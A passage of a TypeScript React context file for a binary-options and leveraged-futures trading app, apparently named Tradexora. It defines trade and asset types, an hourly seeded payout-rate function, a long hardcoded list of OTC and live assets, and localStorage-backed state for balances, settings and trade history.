import React, { createContext, useContext, useState, useEffect, useRef, useCallback } from 'react';
import { sounds, launchWinConfetti } from '../utils/audio';
import { pushLiveTick, getPrecision } from '../utils/candleStore';
import { doc, getDoc, setDoc, onSnapshot } from 'firebase/firestore';
import { firestore } from '../lib/firebase';
import { TimezoneOption, TIMEZONE_OPTIONS, DEFAULT_TIMEZONE } from '../utils/timezone';
import { FuturesAsset, FuturesPosition } from '../types/futures';
import { INITIAL_FUTURES_ASSETS } from '../utils/futuresData';

export type AccountType = 'real' | 'demo';

export interface Trade {
  id: string;
  assetId: string;
  assetName: string;
  amount: number;
  type: 'CALL' | 'PUT';
  entryPrice: number;
  strikeTime: number; // timestamp
  profitMargin: number;
  status: 'active' | 'won' | 'lost' | 'tie';
  accountType: AccountType;
  exitPrice?: number;
  payout?: number;
  createdAt?: number;
  closedAt?: number;
}

export interface Asset {
  id: string;
  name: string;
  symbol: string;
  category: 'Popular' | 'Currencies' | 'Commodities' | 'Crypto' | 'Indices' | 'Stocks';
  profitMargin: number; // e.g., 0.88 for 88%
  price: number;
  change: number;
  favorite: boolean;
  high24h?: number;
  low24h?: number;
}

export interface UserStats {
  email: string;
  name?: string;
  balance: number;
  wagerTarget: number;
  wagerCurrent: number;
  referralCode: string;
  referralCount: number;
  referralBonus: number;
  hasDeposited: boolean;
  isRiskFree: boolean;
  winRate?: number;
}

interface AppContextType {
  userId: string;
  userStats: UserStats | null;
  accountType: AccountType;
  setAccountType: (type: AccountType) => void;
  realBalance: number;
  setRealBalance: React.Dispatch<React.SetStateAction<number>>;
  demoBalance: number;
  setDemoBalance: (balance: number | ((prev: number) => number)) => void;
  refillDemoBalance: () => void;
  currentAsset: Asset;
  setCurrentAsset: (asset: Asset) => void;
  assets: Asset[];
  toggleFavorite: (assetId: string) => void;
  trades: Trade[];
  placeTrade: (amount: number, type: 'CALL' | 'PUT', durationSeconds: number) => boolean;
  fetchBalance: () => void;
  soundEnabled: boolean;
  toggleSound: () => boolean;
  lastTradeResult: { won: boolean; amount: number; profit: number; entryPrice?: number; closePrice?: number } | null;
  dismissTradeResult: () => void;
  priceTickCount: number;
  selectedTimezone: TimezoneOption;
  setSelectedTimezone: (tz: TimezoneOption) => void;
  // 20X Futures Trading
  tradingMode: 'binary' | 'futures';
  setTradingMode: (mode: 'binary' | 'futures') => void;
  futuresAssets: FuturesAsset[];
  currentFuturesAsset: FuturesAsset;
  setCurrentFuturesAsset: (asset: FuturesAsset) => void;
  futuresPositions: FuturesPosition[];
  placeFuturesOrder: (params: { margin: number; type: 'LONG' | 'SHORT'; tpPrice?: number; slPrice?: number }) => boolean;
  closeFuturesPosition: (positionId: string) => void;
}

export function getHourlyProfitMargin(assetId: string, category: string, baseMargin?: number): number {
  // Compute current hour bucket since epoch (changes every 60 minutes)
  const currentHour = Math.floor(Date.now() / (3600 * 1000));
  const numericId = parseInt(assetId.replace(/\D/g, ''), 10) || 1;

  // Seeded pseudo-random formula that stays consistent throughout each 60-minute window
  // and dynamically rotates to a fresh realistic payout rate every single hour
  const hash = Math.abs(Math.sin(numericId * 9301 + currentHour * 49297 + 233) * 100000);
  const variance = hash - Math.floor(hash); // 0.0 to 1.0

  let minRate = 0.80;
  let maxRate = 0.92;

  if (category === 'Popular' || assetId === '1' || assetId === '4' || assetId === '5') {
    minRate = 0.88;
    maxRate = 0.95;
  } else if (category === 'Currencies') {
    minRate = 0.82;
    maxRate = 0.93;
  } else if (category === 'Crypto') {
    minRate = 0.82;
    maxRate = 0.94;
  } else if (category === 'Stocks') {
    minRate = 0.81;
    maxRate = 0.93;
  } else if (category === 'Commodities') {
    minRate = 0.80;
    maxRate = 0.92;
  } else if (category === 'Indices') {
    minRate = 0.83;
    maxRate = 0.93;
  }

  const computedRate = minRate + variance * (maxRate - minRate);
  return Math.round(computedRate * 100) / 100;
}

const INITIAL_ASSETS: Asset[] = [
  // 1. Popular & High Turnover Assets (High payout OTC & Global benchmarks)
  { id: '2', name: 'Bitcoin (Live)', symbol: 'BTC', category: 'Crypto', profitMargin: 0.90, price: 64200.5, change: 3.24, favorite: false },
  { id: '3', name: 'EUR/USD (OTC)', symbol: 'EURUSD', category: 'Currencies', profitMargin: 0.92, price: 1.1523, change: 0.52, favorite: false },
  { id: '4', name: 'Gold (OTC)', symbol: 'XAU', category: 'Commodities', profitMargin: 0.93, price: 2345.1, change: -0.5, favorite: false },
  { id: '5', name: 'USD/INR (OTC)', symbol: 'USDINR', category: 'Currencies', profitMargin: 0.94, price: 86.84, change: 0.18, favorite: false },
  { id: '6', name: 'Tesla (OTC)', symbol: 'TSLA', category: 'Stocks', profitMargin: 0.91, price: 215.60, change: 2.35, favorite: false },
  { id: '8', name: 'Meta (OTC)', symbol: 'META', category: 'Stocks', profitMargin: 0.89, price: 553.43, change: 0.71, favorite: false },

  // 2. Forex / Currencies (OTC pairs)
  { id: '9', name: 'GBP/USD (OTC)', symbol: 'GBPUSD', category: 'Currencies', profitMargin: 0.88, price: 1.2840, change: -0.15, favorite: false },
  { id: '10', name: 'USD/JPY (OTC)', symbol: 'USDJPY', category: 'Currencies', profitMargin: 0.87, price: 154.20, change: -0.42, favorite: false },
  { id: '11', name: 'AUD/USD (OTC)', symbol: 'AUDUSD', category: 'Currencies', profitMargin: 0.85, price: 0.6580, change: 0.28, favorite: false },
  { id: '12', name: 'USD/CAD (OTC)', symbol: 'USDCAD', category: 'Currencies', profitMargin: 0.86, price: 1.3725, change: 0.12, favorite: false },
  { id: '13', name: 'EUR/GBP (OTC)', symbol: 'EURGBP', category: 'Currencies', profitMargin: 0.86, price: 0.8540, change: 0.08, favorite: false },
  { id: '14', name: 'EUR/THB (OTC)', symbol: 'EURTHB', category: 'Currencies', profitMargin: 0.88, price: 37.79, change: 0.06, favorite: false },
  { id: '15', name: 'USD/BRL (OTC)', symbol: 'USDBRL', category: 'Currencies', profitMargin: 0.91, price: 5.4820, change: 0.45, favorite: false },
  { id: '16', name: 'USD/MXN (OTC)', symbol: 'USDMXN', category: 'Currencies', profitMargin: 0.84, price: 18.254, change: -0.22, favorite: false },
  { id: '17', name: 'USD/CHF (OTC)', symbol: 'USDCHF', category: 'Currencies', profitMargin: 0.83, price: 0.8950, change: -0.10, favorite: false },
  { id: '18', name: 'NZD/USD (OTC)', symbol: 'NZDUSD', category: 'Currencies', profitMargin: 0.84, price: 0.6120, change: 0.35, favorite: false },
  { id: '19', name: 'GBP/JPY (OTC)', symbol: 'GBPJPY', category: 'Currencies', profitMargin: 0.88, price: 198.40, change: -0.22, favorite: false },
  { id: '20', name: 'EUR/JPY (OTC)', symbol: 'EURJPY', category: 'Currencies', profitMargin: 0.86, price: 164.80, change: 0.15, favorite: false },
  { id: '21', name: 'AUD/JPY (OTC)', symbol: 'AUDJPY', category: 'Currencies', profitMargin: 0.85, price: 101.45, change: 0.19, favorite: false },
  { id: '22', name: 'CAD/JPY (OTC)', symbol: 'CADJPY', category: 'Currencies', profitMargin: 0.84, price: 112.35, change: -0.08, favorite: false },
  { id: '73', name: 'EUR/CHF (OTC)', symbol: 'EURCHF', category: 'Currencies', profitMargin: 0.85, price: 0.9420, change: 0.05, favorite: false },
  { id: '74', name: 'GBP/CAD (OTC)', symbol: 'GBPCAD', category: 'Currencies', profitMargin: 0.86, price: 1.7650, change: -0.12, favorite: false },
  { id: '75', name: 'AUD/CAD (OTC)', symbol: 'AUDCAD', category: 'Currencies', profitMargin: 0.84, price: 0.9030, change: 0.14, favorite: false },
  { id: '76', name: 'EUR/AUD (OTC)', symbol: 'EURAUD', category: 'Currencies', profitMargin: 0.85, price: 1.6320, change: -0.09, favorite: false },

  // 3. Cryptocurrencies (Top market coins & Memes)
  { id: '23', name: 'Ethereum', symbol: 'ETH', category: 'Crypto', profitMargin: 0.89, price: 3450.8, change: 2.15, favorite: false },
  { id: '24', name: 'Solana (Live)', symbol: 'SOL', category: 'Crypto', profitMargin: 0.91, price: 148.65, change: 4.80, favorite: false },
  { id: '25', name: 'Binance Coin', symbol: 'BNB', category: 'Crypto', profitMargin: 0.86, price: 578.40, change: 1.10, favorite: false },
  { id: '26', name: 'Ripple (Live)', symbol: 'XRP', category: 'Crypto', profitMargin: 0.90, price: 0.5840, change: 5.60, favorite: false },
  { id: '27', name: 'Dogecoin', symbol: 'DOGE', category: 'Crypto', profitMargin: 0.85, price: 0.1245, change: -1.20, favorite: false },
  { id: '28', name: 'Toncoin', symbol: 'TON', category: 'Crypto', profitMargin: 0.88, price: 6.85, change: 3.40, favorite: false },
  { id: '29', name: 'Shiba Inu (OTC)', symbol: 'SHIB', category: 'Crypto', profitMargin: 0.87, price: 0.0000185, change: 4.25, favorite: false },
  { id: '30', name: 'Polygon', symbol: 'POL', category: 'Crypto', profitMargin: 0.86, price: 0.5240, change: 1.80, favorite: false },
  { id: '31', name: 'Chainlink', symbol: 'LINK', category: 'Crypto', profitMargin: 0.85, price: 12.45, change: 2.30, favorite: false },
  { id: '32', name: 'Litecoin', symbol: 'LTC', category: 'Crypto', profitMargin: 0.84, price: 74.20, change: 0.65, favorite: false },
  { id: '33', name: 'Polkadot', symbol: 'DOT', category: 'Crypto', profitMargin: 0.83, price: 5.15, change: -0.40, favorite: false },
  { id: '34', name: 'TRON (Live)', symbol: 'TRX', category: 'Crypto', profitMargin: 0.87, price: 0.1620, change: 1.15, favorite: false },
  { id: '35', name: 'Cardano', symbol: 'ADA', category: 'Crypto', profitMargin: 0.84, price: 0.4680, change: 0.90, favorite: false },
  { id: '36', name: 'Avalanche', symbol: 'AVAX', category: 'Crypto', profitMargin: 0.86, price: 28.90, change: 2.70, favorite: false },
  { id: '37', name: 'Pepe (OTC)', symbol: 'PEPE', category: 'Crypto', profitMargin: 0.88, price: 0.0000098, change: 6.50, favorite: false },
  { id: '77', name: 'NEAR Protocol', symbol: 'NEAR', category: 'Crypto', profitMargin: 0.87, price: 5.42, change: 3.10, favorite: false },
  { id: '78', name: 'Sui Network', symbol: 'SUI', category: 'Crypto', profitMargin: 0.88, price: 2.18, change: 4.60, favorite: false },
  { id: '79', name: 'Aptos', symbol: 'APT', category: 'Crypto', profitMargin: 0.86, price: 9.85, change: 2.40, favorite: false },
  { id: '80', name: 'Render Network', symbol: 'RENDER', category: 'Crypto', profitMargin: 0.87, price: 6.45, change: 5.20, favorite: false },
  { id: '81', name: 'Uniswap', symbol: 'UNI', category: 'Crypto', profitMargin: 0.85, price: 8.90, change: 1.50, favorite: false },
  { id: '82', name: 'Cosmos', symbol: 'ATOM', category: 'Crypto', profitMargin: 0.84, price: 6.75, change: -0.80, favorite: false },
  { id: '83', name: 'Arbitrum', symbol: 'ARB', category: 'Crypto', profitMargin: 0.85, price: 0.85, change: 1.90, favorite: false },
  { id: '84', name: 'Injective', symbol: 'INJ', category: 'Crypto', profitMargin: 0.87, price: 22.40, change: 3.80, favorite: false },

  // 4. Global Stocks
  { id: '38', name: 'Apple (OTC)', symbol: 'AAPL', category: 'Stocks', profitMargin: 0.90, price: 317.79, change: -0.23, favorite: false },
  { id: '39', name: 'Nvidia (OTC)', symbol: 'NVDA', category: 'Stocks', profitMargin: 0.93, price: 128.45, change: 3.80, favorite: false },
  { id: '40', name: 'Microsoft (OTC)', symbol: 'MSFT', category: 'Stocks', profitMargin: 0.88, price: 448.20, change: 0.45, favorite: false },
  { id: '41', name: 'Amazon (OTC)', symbol: 'AMZN', category: 'Stocks', profitMargin: 0.89, price: 186.75, change: 1.20, favorite: false },
  { id: '42', name: 'Alphabet / Google', symbol: 'GOOGL', category: 'Stocks', profitMargin: 0.87, price: 179.30, change: -0.30, favorite: false },
  { id: '43', name: 'AMD (OTC)', symbol: 'AMD', category: 'Stocks', profitMargin: 0.89, price: 154.60, change: 2.80, favorite: false },
  { id: '44', name: 'Intel (OTC)', symbol: 'INTC', category: 'Stocks', profitMargin: 0.85, price: 24.15, change: -1.10, favorite: false },
  { id: '45', name: 'Alibaba (OTC)', symbol: 'BABA', category: 'Stocks', profitMargin: 0.87, price: 84.30, change: 1.95, favorite: false },
  { id: '46', name: 'Coca-Cola (OTC)', symbol: 'KO', category: 'Stocks', profitMargin: 0.86, price: 68.40, change: 0.35, favorite: false },
  { id: '47', name: 'Walt Disney (OTC)', symbol: 'DIS', category: 'Stocks', profitMargin: 0.86, price: 96.20, change: 0.80, favorite: false },
  { id: '48', name: 'Visa (OTC)', symbol: 'V', category: 'Stocks', profitMargin: 0.88, price: 278.50, change: 0.40, favorite: false },
  { id: '49', name: 'Mastercard (OTC)', symbol: 'MA', category: 'Stocks', profitMargin: 0.87, price: 462.80, change: 0.55, favorite: false },
  { id: '50', name: 'Netflix (OTC)', symbol: 'NFLX', category: 'Stocks', profitMargin: 0.87, price: 672.10, change: 1.85, favorite: false },
  { id: '51', name: 'Baidu ADR (OTC)', symbol: 'BIDU', category: 'Stocks', profitMargin: 0.85, price: 108.26, change: -1.84, favorite: false },
  { id: '85', name: 'Taiwan Semi (TSMC)', symbol: 'TSM', category: 'Stocks', profitMargin: 0.90, price: 198.50, change: 2.40, favorite: false },
  { id: '86', name: 'Berkshire Hathaway', symbol: 'BRK', category: 'Stocks', profitMargin: 0.86, price: 462.10, change: 0.30, favorite: false },
  { id: '87', name: 'JPMorgan Chase', symbol: 'JPM', category: 'Stocks', profitMargin: 0.87, price: 224.30, change: 0.65, favorite: false },
  { id: '88', name: 'Walmart Inc.', symbol: 'WMT', category: 'Stocks', profitMargin: 0.86, price: 82.40, change: 0.40, favorite: false },
  { id: '89', name: 'Oracle (OTC)', symbol: 'ORCL', category: 'Stocks', profitMargin: 0.88, price: 172.90, change: 1.75, favorite: false },
  { id: '90', name: 'Broadcom (OTC)', symbol: 'AVGO', category: 'Stocks', profitMargin: 0.89, price: 178.60, change: 2.10, favorite: false },
  { id: '91', name: 'Eli Lilly (OTC)', symbol: 'LLY', category: 'Stocks', profitMargin: 0.88, price: 945.20, change: 1.25, favorite: false },
  { id: '92', name: 'Exxon Mobil', symbol: 'XOM', category: 'Stocks', profitMargin: 0.85, price: 118.40, change: -0.45, favorite: false },
  { id: '93', name: 'Costco Wholesale', symbol: 'COST', category: 'Stocks', profitMargin: 0.87, price: 912.80, change: 0.85, favorite: false },
  { id: '94', name: 'Nike (OTC)', symbol: 'NKE', category: 'Stocks', profitMargin: 0.86, price: 86.50, change: 0.95, favorite: false },
  { id: '95', name: 'Adobe Inc.', symbol: 'ADBE', category: 'Stocks', profitMargin: 0.88, price: 532.70, change: 1.40, favorite: false },
  { id: '96', name: 'Palantir (OTC)', symbol: 'PLTR', category: 'Stocks', profitMargin: 0.91, price: 42.80, change: 4.60, favorite: false },
  { id: '97', name: 'Coinbase Global', symbol: 'COIN', category: 'Stocks', profitMargin: 0.90, price: 218.40, change: 3.90, favorite: false },
  { id: '98', name: 'Spotify (OTC)', symbol: 'SPOT', category: 'Stocks', profitMargin: 0.87, price: 375.60, change: 1.60, favorite: false },
  { id: '99', name: 'Uber Technologies', symbol: 'UBER', category: 'Stocks', profitMargin: 0.88, price: 74.30, change: 1.30, favorite: false },

  // 5. Commodities & Precious Metals
  { id: '57', name: 'Silver (OTC)', symbol: 'XAG', category: 'Commodities', profitMargin: 0.88, price: 29.45, change: 1.10, favorite: false },
  { id: '58', name: 'Platinum (OTC)', symbol: 'XPT', category: 'Commodities', profitMargin: 0.86, price: 955.40, change: 0.65, favorite: false },
  { id: '59', name: 'Palladium (OTC)', symbol: 'XPD', category: 'Commodities', profitMargin: 0.85, price: 980.20, change: -0.40, favorite: false },
  { id: '60', name: 'Crude Oil Brent', symbol: 'BRENT', category: 'Commodities', profitMargin: 0.88, price: 84.60, change: -0.75, favorite: false },
  { id: '61', name: 'Crude Oil WTI', symbol: 'WTI', category: 'Commodities', profitMargin: 0.86, price: 80.25, change: -0.60, favorite: false },
  { id: '62', name: 'Natural Gas', symbol: 'NG', category: 'Commodities', profitMargin: 0.83, price: 2.15, change: 1.80, favorite: false },
  { id: '63', name: 'Copper (Live)', symbol: 'HG', category: 'Commodities', profitMargin: 0.84, price: 4.45, change: 0.50, favorite: false },
  { id: '100', name: 'Gold in EUR (OTC)', symbol: 'XAUEUR', category: 'Commodities', profitMargin: 0.89, price: 2150.80, change: 0.35, favorite: false },
  { id: '101', name: 'Silver in EUR (OTC)', symbol: 'XAGEUR', category: 'Commodities', profitMargin: 0.87, price: 27.15, change: 0.80, favorite: false },

  // 6. Global Indices & Market Benchmarks
  { id: '64', name: 'NASDAQ 100', symbol: 'NDX', category: 'Indices', profitMargin: 0.89, price: 19850.0, change: 0.95, favorite: false },
  { id: '65', name: 'S&P 500', symbol: 'SPX', category: 'Indices', profitMargin: 0.88, price: 5540.2, change: 0.40, favorite: false },
  { id: '66', name: 'Dow Jones 30', symbol: 'DJI', category: 'Indices', profitMargin: 0.87, price: 40280.0, change: 0.25, favorite: false },
  { id: '69', name: 'DAX 40 Germany', symbol: 'GER40', category: 'Indices', profitMargin: 0.86, price: 18650.0, change: 0.15, favorite: false },
  { id: '70', name: 'FTSE 100 UK', symbol: 'UK100', category: 'Indices', profitMargin: 0.85, price: 8240.0, change: -0.10, favorite: false },
  { id: '71', name: 'Nikkei 225 Japan', symbol: 'JP225', category: 'Indices', profitMargin: 0.87, price: 38250.0, change: 0.60, favorite: false },
  { id: '72', name: 'Hang Seng (OTC)', symbol: 'HSI', category: 'Indices', profitMargin: 0.88, price: 17650.0, change: -0.35, favorite: false },
  { id: '102', name: 'CAC 40 France', symbol: 'CAC40', category: 'Indices', profitMargin: 0.86, price: 7540.0, change: 0.20, favorite: false },
  { id: '103', name: 'Euro Stoxx 50', symbol: 'SX5E', category: 'Indices', profitMargin: 0.87, price: 4920.0, change: 0.15, favorite: false },
  { id: '104', name: 'ASX 200 Australia', symbol: 'ASX200', category: 'Indices', profitMargin: 0.85, price: 8120.0, change: 0.30, favorite: false },
  { id: '105', name: 'IBEX 35 Spain', symbol: 'IBEX35', category: 'Indices', profitMargin: 0.86, price: 11650.0, change: -0.10, favorite: false }
  // 7. Added 50+ New Assets
  , { id: '106', name: 'Nifty 50 (OTC)', symbol: 'NIFTY50', category: 'Indices', profitMargin: 0.88, price: 24500.0, change: 0.45, favorite: false }
  , { id: '107', name: 'Bank Nifty (OTC)', symbol: 'BANKNIFTY', category: 'Indices', profitMargin: 0.89, price: 51200.0, change: 0.60, favorite: false }
  , { id: '108', name: 'Sensex (OTC)', symbol: 'SENSEX', category: 'Indices', profitMargin: 0.87, price: 80500.0, change: 0.40, favorite: false }
  , { id: '109', name: 'VIX Volatility', symbol: 'VIX', category: 'Indices', profitMargin: 0.84, price: 14.50, change: -2.10, favorite: false }
  , { id: '110', name: 'Russell 2000', symbol: 'RUT', category: 'Indices', profitMargin: 0.86, price: 2150.0, change: 1.15, favorite: false }
  
  , { id: '111', name: 'PepsiCo (OTC)', symbol: 'PEP', category: 'Stocks', profitMargin: 0.86, price: 165.20, change: -0.15, favorite: false }
  , { id: '112', name: 'McDonald\'s (OTC)', symbol: 'MCD', category: 'Stocks', profitMargin: 0.87, price: 280.40, change: 0.25, favorite: false }
  , { id: '113', name: 'Salesforce (OTC)', symbol: 'CRM', category: 'Stocks', profitMargin: 0.88, price: 260.15, change: 1.40, favorite: false }
  , { id: '114', name: 'Chevron (OTC)', symbol: 'CVX', category: 'Stocks', profitMargin: 0.85, price: 158.30, change: -0.45, favorite: false }
  , { id: '115', name: 'Bank of America (OTC)', symbol: 'BAC', category: 'Stocks', profitMargin: 0.86, price: 39.50, change: 0.80, favorite: false }
  , { id: '116', name: 'Home Depot (OTC)', symbol: 'HD', category: 'Stocks', profitMargin: 0.87, price: 345.60, change: 0.55, favorite: false }
  , { id: '117', name: 'Johnson & Johnson', symbol: 'JNJ', category: 'Stocks', profitMargin: 0.85, price: 148.90, change: 0.10, favorite: false }
  , { id: '118', name: 'Procter & Gamble', symbol: 'PG', category: 'Stocks', profitMargin: 0.86, price: 162.30, change: 0.20, favorite: false }
  , { id: '119', name: 'Cisco (OTC)', symbol: 'CSCO', category: 'Stocks', profitMargin: 0.85, price: 48.20, change: -0.30, favorite: false }
  , { id: '120', name: 'Verizon (OTC)', symbol: 'VZ', category: 'Stocks', profitMargin: 0.84, price: 41.50, change: 0.60, favorite: false }
  , { id: '121', name: 'AT&T (OTC)', symbol: 'T', category: 'Stocks', profitMargin: 0.84, price: 18.20, change: 0.40, favorite: false }
  , { id: '122', name: 'Pfizer (OTC)', symbol: 'PFE', category: 'Stocks', profitMargin: 0.85, price: 28.40, change: -0.15, favorite: false }
  , { id: '123', name: 'Boeing (OTC)', symbol: 'BA', category: 'Stocks', profitMargin: 0.87, price: 185.60, change: 1.20, favorite: false }
  , { id: '124', name: 'Qualcomm (OTC)', symbol: 'QCOM', category: 'Stocks', profitMargin: 0.89, price: 205.40, change: 2.10, favorite: false }
  , { id: '125', name: 'ARM Holdings (OTC)', symbol: 'ARM', category: 'Stocks', profitMargin: 0.90, price: 145.80, change: 3.50, favorite: false }
  , { id: '126', name: 'Super Micro (OTC)', symbol: 'SMCI', category: 'Stocks', profitMargin: 0.91, price: 890.50, change: 4.80, favorite: false }
  , { id: '127', name: 'Moderna (OTC)', symbol: 'MRNA', category: 'Stocks', profitMargin: 0.88, price: 124.30, change: -1.40, favorite: false }
  , { id: '128', name: 'Airbnb (OTC)', symbol: 'ABNB', category: 'Stocks', profitMargin: 0.87, price: 156.20, change: 1.10, favorite: false }
  , { id: '129', name: 'Shopify (OTC)', symbol: 'SHOP', category: 'Stocks', profitMargin: 0.88, price: 72.40, change: 2.30, favorite: false }
  , { id: '130', name: 'Square (OTC)', symbol: 'SQ', category: 'Stocks', profitMargin: 0.87, price: 68.90, change: 1.80, favorite: false }
  , { id: '131', name: 'PayPal (OTC)', symbol: 'PYPL', category: 'Stocks', profitMargin: 0.86, price: 64.50, change: 0.70, favorite: false }
  
  , { id: '132', name: 'Stellar', symbol: 'XLM', category: 'Crypto', profitMargin: 0.84, price: 0.1050, change: 1.20, favorite: false }
  , { id: '133', name: 'Internet Computer', symbol: 'ICP', category: 'Crypto', profitMargin: 0.85, price: 9.40, change: -0.80, favorite: false }
  , { id: '134', name: 'Filecoin', symbol: 'FIL', category: 'Crypto', profitMargin: 0.84, price: 4.50, change: 0.40, favorite: false }
  , { id: '135', name: 'VeChain', symbol: 'VET', category: 'Crypto', profitMargin: 0.83, price: 0.0340, change: 1.10, favorite: false }
  , { id: '136', name: 'Monero', symbol: 'XMR', category: 'Crypto', profitMargin: 0.86, price: 165.20, change: 0.50, favorite: false }
  , { id: '137', name: 'Aave', symbol: 'AAVE', category: 'Crypto', profitMargin: 0.87, price: 102.40, change: 2.50, favorite: false }
  , { id: '138', name: 'Algorand', symbol: 'ALGO', category: 'Crypto', profitMargin: 0.84, price: 0.1520, change: -0.30, favorite: false }
  , { id: '139', name: 'Theta Network', symbol: 'THETA', category: 'Crypto', profitMargin: 0.85, price: 1.65, change: 1.80, favorite: false }
  , { id: '140', name: 'Elrond (MultiversX)', symbol: 'EGLD', category: 'Crypto', profitMargin: 0.86, price: 34.20, change: 0.90, favorite: false }
  , { id: '141', name: 'The Sandbox', symbol: 'SAND', category: 'Crypto', profitMargin: 0.85, price: 0.3540, change: -1.20, favorite: false }
  , { id: '142', name: 'Decentraland', symbol: 'MANA', category: 'Crypto', profitMargin: 0.84, price: 0.3420, change: 0.40, favorite: false }
  , { id: '143', name: 'Axie Infinity', symbol: 'AXS', category: 'Crypto', profitMargin: 0.85, price: 6.20, change: 2.10, favorite: false }
  , { id: '144', name: 'Gala', symbol: 'GALA', category: 'Crypto', profitMargin: 0.84, price: 0.0280, change: 1.50, favorite: false }
  , { id: '145', name: 'Quant', symbol: 'QNT', category: 'Crypto', profitMargin: 0.87, price: 82.40, change: -0.60, favorite: false }
  , { id: '146', name: 'Fantom', symbol: 'FTM', category: 'Crypto', profitMargin: 0.86, price: 0.5420, change: 3.20, favorite: false }
  , { id: '147', name: 'Helium', symbol: 'HNT', category: 'Crypto', profitMargin: 0.85, price: 4.80, change: 0.80, favorite: false }
  , { id: '148', name: 'Maker', symbol: 'MKR', category: 'Crypto', profitMargin: 0.88, price: 2840.0, change: 1.40, favorite: false }
  , { id: '149', name: 'Stacks', symbol: 'STX', category: 'Crypto', profitMargin: 0.87, price: 1.85, change: 4.10, favorite: false }

  , { id: '150', name: 'Aluminum (OTC)', symbol: 'ALU', category: 'Commodities', profitMargin: 0.84, price: 2450.0, change: -0.30, favorite: false }
  , { id: '151', name: 'Zinc (OTC)', symbol: 'ZNC', category: 'Commodities', profitMargin: 0.83, price: 2850.0, change: 0.20, favorite: false }
  , { id: '152', name: 'Nickel (OTC)', symbol: 'NIC', category: 'Commodities', profitMargin: 0.85, price: 18200.0, change: 1.10, favorite: false }
  , { id: '153', name: 'Cocoa (OTC)', symbol: 'COCOA', category: 'Commodities', profitMargin: 0.89, price: 9240.0, change: -1.50, favorite: false }
  , { id: '154', name: 'Coffee (OTC)', symbol: 'COFFEE', category: 'Commodities', profitMargin: 0.86, price: 235.40, change: 2.30, favorite: false }
  , { id: '155', name: 'Wheat (OTC)', symbol: 'WHEAT', category: 'Commodities', profitMargin: 0.84, price: 580.20, change: 0.80, favorite: false }

  , { id: '156', name: 'GBP/CHF (OTC)', symbol: 'GBPCHF', category: 'Currencies', profitMargin: 0.86, price: 1.1420, change: 0.15, favorite: false }
  , { id: '157', name: 'AUD/NZD (OTC)', symbol: 'AUDNZD', category: 'Currencies', profitMargin: 0.84, price: 1.0840, change: -0.10, favorite: false }
  , { id: '158', name: 'NZD/JPY (OTC)', symbol: 'NZDJPY', category: 'Currencies', profitMargin: 0.85, price: 94.20, change: 0.25, favorite: false }
  , { id: '159', name: 'CHF/JPY (OTC)', symbol: 'CHFJPY', category: 'Currencies', profitMargin: 0.87, price: 172.40, change: -0.30, favorite: false }
  , { id: '160', name: 'CAD/CHF (OTC)', symbol: 'CADCHF', category: 'Currencies', profitMargin: 0.85, price: 0.6520, change: 0.05, favorite: false }
];


const AppContext = createContext<AppContextType | undefined>(undefined);

export const AppProvider: React.FC<{ children: React.ReactNode; userId: string }> = ({ children, userId }) => {
  // Always default to Real (Live) Account upon opening
  const [accountType, setAccountType] = useState<AccountType>('real');
  const [realBalance, setRealBalance] = useState(0);
  const [demoBalance, setDemoBalanceState] = useState<number>(() => {
    try {
      const saved = localStorage.getItem('tradexora_demo_balance');
      if (saved !== null) {
        const parsed = parseFloat(saved);
        if (!isNaN(parsed) && parsed > 0) return parsed;
      }
    } catch (e) {}
    return 10000;
  });

  const setDemoBalance = useCallback((valOrFn: number | ((prev: number) => number)) => {
    setDemoBalanceState(prev => {
      const next = typeof valOrFn === 'function' ? valOrFn(prev) : valOrFn;
      const rounded = Math.round(next * 100) / 100;
      try {
        localStorage.setItem('tradexora_demo_balance', String(rounded));
      } catch (e) {}
      return rounded;
    });
  }, []);

  const refillDemoBalance = useCallback(() => {
    setDemoBalance(10000);
    try {
      sounds.playWin();
    } catch (e) {}
  }, [setDemoBalance]);
  const [userStats, setUserStats] = useState<UserStats | null>(null);

  // UTC Timezone State
  const [selectedTimezone, setSelectedTimezoneState] = useState<TimezoneOption>(() => {
    try {
      const saved = localStorage.getItem('tradexora_timezone');
      if (saved) {
        const parsed = JSON.parse(saved);
        const match = TIMEZONE_OPTIONS.find(t => t.id === parsed.id || t.utcLabel === parsed.utcLabel);
        if (match) return match;
      }
    } catch (e) {}
    return DEFAULT_TIMEZONE;
  });

  const setSelectedTimezone = (tz: TimezoneOption) => {
    setSelectedTimezoneState(tz);
    try {
      localStorage.setItem('tradexora_timezone', JSON.stringify(tz));
    } catch (e) {}
  };
  const [assets, setAssets] = useState<Asset[]>(() => {
    try {
      const savedFavs = localStorage.getItem('tradexora_user_favorites');
      const favIds: string[] = savedFavs ? JSON.parse(savedFavs) : [];
      return INITIAL_ASSETS.map(a => ({
        ...a,
        profitMargin: getHourlyProfitMargin(a.id, a.category, a.profitMargin),
        favorite: favIds.includes(a.id)
      })).sort((a, b) => b.profitMargin - a.profitMargin);
    } catch (e) {
      return INITIAL_ASSETS.map(a => ({
        ...a,
        profitMargin: getHourlyProfitMargin(a.id, a.category, a.profitMargin),
        favorite: false
      })).sort((a, b) => b.profitMargin - a.profitMargin);
    }
  });
  const [currentAsset, setCurrentAsset] = useState<Asset>(() => {
    const first = INITIAL_ASSETS[0];
    return {
      ...first,
      profitMargin: getHourlyProfitMargin(first.id, first.category, first.profitMargin)
    };
  });
  
  // --- 20X FUTURES TRADING STATE ---
  const [tradingMode, setTradingModeState] = useState<'binary' | 'futures'>(() => {
    try {
      return (localStorage.getItem('tradexora_trading_mode') as 'binary' | 'futures') || 'binary';
    } catch {
      return 'binary';
    }
  });

  const setTradingMode = (mode: 'binary' | 'futures') => {
    setTradingModeState(mode);
    try {
      localStorage.setItem('tradexora_trading_mode', mode);
    } catch {}
  };

  const [futuresAssets, setFuturesAssets] = useState<FuturesAsset[]>(INITIAL_FUTURES_ASSETS);
  const [currentFuturesAsset, setCurrentFuturesAsset] = useState<FuturesAsset>(INITIAL_FUTURES_ASSETS[0]);

  const [futuresPositions, setFuturesPositions] = useState<FuturesPosition[]>(() => {
    try {
      const stored = localStorage.getItem(`tradexora_futures_${userId || 'guest'}`);
      if (stored) return JSON.parse(stored);
    } catch (e) {
      console.warn("Failed to load futures positions:", e);
    }
    return [];
  });

  // Persistent Trade History Initialization from LocalStorage
  const [trades, setTrades] = useState<Trade[]>(() => {
    try {
      const stored = localStorage.getItem(`tradexora_trades_${userId || 'guest'}`);
      if (stored) {
        return JSON.parse(stored);
      }
    } catch (e) {
      console.warn("Failed to load stored trades:", e);
    }
    return [];
  });

